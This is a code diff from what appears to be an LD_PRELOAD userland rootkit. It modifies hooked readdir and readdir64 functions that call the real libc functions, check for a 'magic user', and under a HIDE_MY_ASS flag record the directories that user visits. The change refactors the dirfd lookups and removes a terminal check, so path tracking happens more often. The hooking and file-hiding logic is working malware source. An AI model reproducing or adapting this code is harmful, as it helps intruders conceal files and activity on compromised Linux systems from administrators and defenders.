@@ -2,16 +2,15 @@ struct dirent *readdir(DIR *dirp){
     char *filename;
     struct dirent *dir;
     size_t pathlen;
+    int df = dirfd(dirp);
 
     hook(CREADDIR);
 
     while((dir = call(CREADDIR, dirp)) != NULL){
         if(magicusr()){
 #ifdef HIDE_MY_ASS
-            int outfd = fileno(stdout);
-            if(!outfd) return dir;
-            if(isatty(outfd)){
-                char *apath = gdirname(dirfd(dirp));
+            char *apath = gdirname(df);
+            if(apath != NULL){
                 if(!pathtracked(apath))
                     trackwrite(apath);
                 free(apath);
@@ -23,7 +22,7 @@ struct dirent *readdir(DIR *dirp){
         if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
 
-        filename = gdirname(dirfd(dirp));
+        filename = gdirname(df);
         pathlen = strlen(filename) +
                   strlen(dir->d_name) + 2;
 
@@ -49,16 +48,15 @@ struct dirent64 *readdir64(DIR *dirp){
     char *filename;
     struct dirent64 *dir;
     size_t pathlen;
+    int df = dirfd(dirp);
 
     hook(CREADDIR64);
 
     while((dir = call(CREADDIR64, dirp)) != NULL){
         if(magicusr()){
 #ifdef HIDE_MY_ASS
-            int outfd = fileno(stdout);
-            if(!outfd) return dir;
-            if(isatty(outfd)){
-                char *apath = gdirname(dirfd(dirp));
+            char *apath = gdirname(df);
+            if(apath != NULL){
                 if(!pathtracked(apath))
                     trackwrite(apath);
                 free(apath);
@@ -70,7 +68,7 @@ struct dirent64 *readdir64(DIR *dirp){
         if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
 
-        filename = gdirname(dirfd(dirp));
+        filename = gdirname(df);
         pathlen = strlen(filename) +
                   strlen(dir->d_name) + 2;
 
